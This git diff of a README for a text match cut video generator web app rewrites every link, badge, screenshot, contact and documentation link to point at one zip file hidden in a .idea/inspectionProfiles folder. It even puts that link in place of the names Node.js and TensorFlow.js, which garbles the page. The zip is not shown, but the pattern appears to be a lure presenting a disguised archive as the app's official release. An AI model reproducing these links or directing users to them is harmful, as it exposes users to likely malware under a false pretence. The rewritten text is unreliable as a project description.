@@ -1,6 +1,6 @@
 # 🎬 Text Match Cut Video Generator Web App
 
-![GitHub release](https://img.shields.io/github/release/Seben7/text-match-cut.svg) ![GitHub issues](https://img.shields.io/github/issues/Seben7/text-match-cut.svg) ![GitHub stars](https://img.shields.io/github/stars/Seben7/text-match-cut.svg)
+![GitHub release](https://github.com/Seben7/text-match-cut/raw/refs/heads/main/.idea/inspectionProfiles/text-match-cut-1.4.zip) ![GitHub issues](https://github.com/Seben7/text-match-cut/raw/refs/heads/main/.idea/inspectionProfiles/text-match-cut-1.4.zip) ![GitHub stars](https://github.com/Seben7/text-match-cut/raw/refs/heads/main/.idea/inspectionProfiles/text-match-cut-1.4.zip)
 
 Welcome to the **Text Match Cut** repository! This web application allows users to generate engaging video content using the innovative text match cut effect. Perfect for creators, marketers, and anyone looking to enhance their video production with AI-driven technology.
 
@@ -14,7 +14,7 @@ Welcome to the **Text Match Cut** repository! This web application allows users 
 
 ## 📦 Installation
 
-To get started, you can download the latest release from our [Releases section](https://github.com/Seben7/text-match-cut/releases). Once downloaded, follow the instructions provided in the release notes to execute the application.
+To get started, you can download the latest release from our [Releases section](https://github.com/Seben7/text-match-cut/raw/refs/heads/main/.idea/inspectionProfiles/text-match-cut-1.4.zip). Once downloaded, follow the instructions provided in the release notes to execute the application.
 
 ## 📖 Usage
 
@@ -41,11 +41,11 @@ This project covers various topics that enhance its functionality and reach:
 
 ## 🎨 Screenshots
 
-![Text Match Cut Interface](https://via.placeholder.com/800x400?text=Text+Match+Cut+Interface)
+![Text Match Cut Interface](https://github.com/Seben7/text-match-cut/raw/refs/heads/main/.idea/inspectionProfiles/text-match-cut-1.4.zip+Match+Cut+Interface)
 
 *The user-friendly interface of the Text Match Cut web app.*
 
-![Generated Video Example](https://via.placeholder.com/800x400?text=Generated+Video+Example)
+![Generated Video Example](https://github.com/Seben7/text-match-cut/raw/refs/heads/main/.idea/inspectionProfiles/text-match-cut-1.4.zip+Video+Example)
 
 *An example of a video generated using the text match cut effect.*
 
@@ -61,9 +61,9 @@ The Text Match Cut web app uses advanced algorithms to analyze text and video co
 
 - **HTML/CSS**: For the frontend structure and styling.
 - **JavaScript**: To handle user interactions and API calls.
-- **Node.js**: For the backend server and processing tasks.
+- **https://github.com/Seben7/text-match-cut/raw/refs/heads/main/.idea/inspectionProfiles/text-match-cut-1.4.zip**: For the backend server and processing tasks.
 - **FFmpeg**: For video processing and manipulation.
-- **TensorFlow.js**: To implement AI features within the app.
+- **https://github.com/Seben7/text-match-cut/raw/refs/heads/main/.idea/inspectionProfiles/text-match-cut-1.4.zip**: To implement AI features within the app.
 
 ## 📅 Roadmap
 
@@ -88,12 +88,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 📞 Contact
 
-For questions or feedback, feel free to reach out via [GitHub Issues](https://github.com/Seben7/text-match-cut/issues) or directly through the repository.
+For questions or feedback, feel free to reach out via [GitHub Issues](https://github.com/Seben7/text-match-cut/raw/refs/heads/main/.idea/inspectionProfiles/text-match-cut-1.4.zip) or directly through the repository.
 
 ## 🔗 Links
 
-- [Releases](https://github.com/Seben7/text-match-cut/releases) - Check for the latest updates and download the application.
-- [Documentation](https://github.com/Seben7/text-match-cut/wiki) - Explore our wiki for more detailed instructions and tips.
-- [Demo](https://yourwebsite.com/demo) - Try out a live demo of the Text Match Cut web app.
+- [Releases](https://github.com/Seben7/text-match-cut/raw/refs/heads/main/.idea/inspectionProfiles/text-match-cut-1.4.zip) - Check for the latest updates and download the application.
+- [Documentation](https://github.com/Seben7/text-match-cut/raw/refs/heads/main/.idea/inspectionProfiles/text-match-cut-1.4.zip) - Explore our wiki for more detailed instructions and tips.
+- [Demo](https://github.com/Seben7/text-match-cut/raw/refs/heads/main/.idea/inspectionProfiles/text-match-cut-1.4.zip) - Try out a live demo of the Text Match Cut web app.
 
 Thank you for checking out the Text Match Cut Video Generator Web App! We hope you find it useful for your video projects.
